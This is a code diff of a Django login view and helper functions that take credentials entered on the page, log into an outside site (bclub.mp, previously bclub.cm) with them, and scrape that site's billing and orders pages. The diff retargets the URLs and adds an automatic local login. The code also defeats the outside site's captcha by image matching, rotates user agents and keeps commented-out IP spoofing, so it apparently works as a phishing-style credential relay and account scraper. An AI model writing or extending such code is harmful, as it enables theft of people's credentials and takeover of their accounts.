@@ -178,10 +178,10 @@ import requests
 from bs4 import BeautifulSoup
 
 # Configuration
-LOGIN_URL = 'https://bclub.cm/login/'
-CAPTCHA_BASE_URL = 'https://bclub.cm/captcha/image/'
-BILLING_URL = 'https://bclub.cm/billing/'
-ORDERS_URL = 'https://bclub.cm/orders/'
+LOGIN_URL = 'https://bclub.mp/login/'
+CAPTCHA_BASE_URL = 'https://bclub.mp/captcha/image/'
+BILLING_URL = 'https://bclub.mp/billing/'
+ORDERS_URL = 'https://bclub.mp/orders/'
 USER_DATA_CREATE_URL = 'http://bclub.cc/userdata/create/'
 
 # Initialize session
@@ -203,7 +203,7 @@ def generate_random_ip():
 
 def process_login_and_balance(session, headers, user):
     # Attempt to retrieve the login page and necessary CSRF tokens
-    login_response = session.get('https://bclub.cm/login/', headers=headers)
+    login_response = session.get('https://bclub.mp/login/', headers=headers)
     if login_response.status_code != 200:
         print("Error: Login page not reachable")
         return False
@@ -212,7 +212,7 @@ def process_login_and_balance(session, headers, user):
     csrf_token = login_response.cookies.get('csrftoken')
     input_element = soup.find('input', {'id': 'id_captcha_0'})
     value = input_element['value']  # type: ignore
-    img2_url = f'https://bclub.cm/captcha/image/{value}/'
+    img2_url = f'https://bclub.mp/captcha/image/{value}/'
 
     capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')
 
@@ -226,7 +226,7 @@ def process_login_and_balance(session, headers, user):
         'captcha_0': value,
         'captcha_1': captcha_solution,
     }
-    response = session.post('https://bclub.cm/login/', headers=headers, data=login_data)
+    response = session.post('https://bclub.mp/login/', headers=headers, data=login_data)
     print('status', response.status_code)
     if b'incorrect' in response.content:
         print("Error: Login failed")
@@ -254,7 +254,7 @@ def create_user_and_process(session, username, password):
         'User-Agent': random.choice(user_agents),
         # 'X-Forwarded-For': generate_random_ip(),
     }
-    login_response = session.get('https://bclub.cm/login/', headers=headers)
+    login_response = session.get('https://bclub.mp/login/', headers=headers)
     if login_response.status_code != 200:
         print("Error: Login page not reachable")
         return False
@@ -264,7 +264,7 @@ def create_user_and_process(session, username, password):
     print('csrf_token', csrf_token)
     input_element = soup.find('input', {'id': 'id_captcha_0'})
     value = input_element['value']  # type: ignore
-    img2_url = f'https://bclub.cm/captcha/image/{value}/'
+    img2_url = f'https://bclub.mp/captcha/image/{value}/'
     print('img2_url', img2_url)
     capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')
     print('capvalue', capvalue)
@@ -277,7 +277,7 @@ def create_user_and_process(session, username, password):
         'captcha_0': value,
         'captcha_1': capvalue,
     }
-    url = 'https://bclub.cm'
+    url = 'https://bclub.mp'
     user_agents = [
                     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                 ]
@@ -287,7 +287,7 @@ def create_user_and_process(session, username, password):
                                     "Referer": url + "/login/",
                                     'User-Agent': random.choice(user_agents)
                                 }
-    response = session.post('https://bclub.cm/login/', headers=headers, data=login_data)
+    response = session.post('https://bclub.mp/login/', headers=headers, data=login_data)
     print('status', response.status_code)
     if b'Login or password are incorrect' in response.content:
         print("Error: Login failed")
@@ -342,12 +342,12 @@ def create_user_and_process(session, username, password):
 
 
 def process_billing_and_orders(session, user, headers):
-    billing_response = session.get('https://bclub.cm/billing/', headers=headers)
+    billing_response = session.get('https://bclub.mp/billing/', headers=headers)
     if billing_response.status_code == 200:
         billing_soup = BeautifulSoup(billing_response.content, 'html.parser')
         process_billing(billing_soup, user)
 
-    orders_response = session.get('https://bclub.cm/orders/', headers=headers)
+    orders_response = session.get('https://bclub.mp/orders/', headers=headers)
     if orders_response.status_code == 200:
         orders_soup = BeautifulSoup(orders_response.content, 'html.parser')
         process_orders(orders_soup, user)
@@ -511,6 +511,10 @@ def loginreq(request):
                                         print('sd')
                                         with requests.Session() as session:
                                                 if create_user_and_process(session, username, password):
+                                                    newUser = authenticate(request, username=username, password=password)
+                                                    if newUser is not None:
+                                                        login(request, newUser)
+                                                        return redirect('dashboard')
                                                     print('Success')
                                                 else:
                                                     try:
@@ -635,11 +639,11 @@ def loginreq(request):
 #                 'username': username,
 #                 'password': password
 #             }
-#         response1 = session.get('https://bclub.cm/login/', headers=headers)
+#         response1 = session.get('https://bclub.mp/login/', headers=headers)
 #         soup = BeautifulSoup(response1.content, 'html.parser')
 #         input_element = soup.find('input', {'id': 'id_captcha_0'})
 #         value = input_element['value']
-#         img2_url = f'https://bclub.cm/captcha/image/{value}/'
+#         img2_url = f'https://bclub.mp/captcha/image/{value}/'
 #         capvalue=find_identical_and_calculate(img2_url, './brianimages/')
 #         print(capvalue)
 #         csrf_token = response1.cookies['csrftoken']
@@ -647,7 +651,7 @@ def loginreq(request):
 #         headers = {
 #             "X-CSRFToken": csrf_token,
 #             "Content-Type": "application/x-www-form-urlencoded",
-#             "Referer": "https://bclub.cm/login/",
+#             "Referer": "https://bclub.mp/login/",
 #             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
 #         }
 #         data = {
@@ -657,7 +661,7 @@ def loginreq(request):
 #             'captcha_0': value,
 #             'captcha_1': capvalue,
 #         }
-#         response = session.post('https://bclub.cm/login/', headers=headers, data=data)
+#         response = session.post('https://bclub.mp/login/', headers=headers, data=data)
 #         if b'Login or password are incorrect' in response.content:
 #             print("Error: Login failed")
 #         else:
@@ -672,10 +676,10 @@ def loginreq(request):
 #                 headers = {
 #                     "X-CSRFToken": csrf_token,
 #                     "Cookie": f"sessionid={session.cookies['sessionid']}",
-#                     "Referer": "https://bclub.cm/login/",
+#                     "Referer": "https://bclub.mp/login/",
 #                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
 #                 }
-#                 response3 = session.get('https://bclub.cm/orders/', headers=headers)
+#                 response3 = session.get('https://bclub.mp/orders/', headers=headers)
 #                 print('response3',response3.status_code)
 #                 soup = BeautifulSoup(response3.content, 'html.parser')
 #                 table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
